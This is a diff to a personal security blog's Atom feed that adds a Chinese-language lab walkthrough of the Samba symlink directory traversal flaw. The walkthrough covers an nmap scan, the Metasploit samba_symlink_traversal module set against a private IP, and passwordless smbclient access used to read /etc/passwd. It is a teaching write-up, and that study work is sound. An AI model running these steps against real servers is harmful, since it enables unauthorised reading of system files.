@@ -6,7 +6,7 @@
   <link href="http://0xchang.github.io/atom.xml" rel="self"/>
   
   <link href="http://0xchang.github.io/"/>
-  <updated>2021-12-18T16:38:05.759Z</updated>
+  <updated>2021-12-20T09:42:59.545Z</updated>
   <id>http://0xchang.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sysmlink漏洞</title>
+    <link href="http://0xchang.github.io/2021/12/20/sysmlink%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://0xchang.github.io/2021/12/20/sysmlink%E6%BC%8F%E6%B4%9E/</id>
+    <published>2021-12-20T08:32:26.000Z</published>
+    <updated>2021-12-20T09:42:59.545Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="sysmlink-目录遍历漏洞"><a href="#sysmlink-目录遍历漏洞" class="headerlink" title="sysmlink 目录遍历漏洞"></a>sysmlink 目录遍历漏洞</h2><h3 id="利用sysmlink漏洞读取目标主机的passwd文件内容"><a href="#利用sysmlink漏洞读取目标主机的passwd文件内容" class="headerlink" title="利用sysmlink漏洞读取目标主机的passwd文件内容"></a>利用sysmlink漏洞读取目标主机的passwd文件内容</h3><h4 id="原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。"><a href="#原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。" class="headerlink" title="原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。"></a>原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>使用nmap -sV ip 扫描主机，确认开放445，139端口且安装了samba服务，版本为3</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220165606561.png" alt="image-20211220165606561"></p><p>命令行输入search samba，搜索samba的相关工具和载荷。</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173445099.png" alt="image-20211220173445099"></p><p>终端中输入use auxiliary/admin/smb/samba_symlink_traversal，启用漏洞利用模块</p><p>输入info，”yes”表示必须要填写的信息</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173527544.png" alt="image-20211220173527544"></p><p>输入set RHOST 192.168.1.3和set SMBSHARE tmp，设置主机ip地址和SAM可写文件</p><p>输入exploit开始攻击</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173602852.png" alt="image-20211220173602852"></p><p>新建终端，输入smbclient //192.168.1.3/tmp，直接回车，无密码</p><p>输入cd rootfs,进入rootfs目录，输入ls，列出目录</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173635907.png" alt="image-20211220173635907"></p><p>输入more /etc/passwd</p><p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173656794-16399930170041.png" alt="image-20211220173656794"></p><p>此实验完成</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;sysmlink-目录遍历漏洞&quot;&gt;&lt;a href=&quot;#sysmlink-目录遍历漏洞&quot; class=&quot;headerlink&quot; title=&quot;sysmlink 目录遍历漏洞&quot;&gt;&lt;/a&gt;sysmlink 目录遍历漏洞&lt;/h2&gt;&lt;h3 id=&quot;利用sysmlink漏洞读</summary>
+      
+    
+    
+    
+    
+    <category term="sysmlink msf" scheme="http://0xchang.github.io/tags/sysmlink-msf/"/>
+    
+  </entry>
   
   <entry>
     <title>redrock-wp-2021</title>
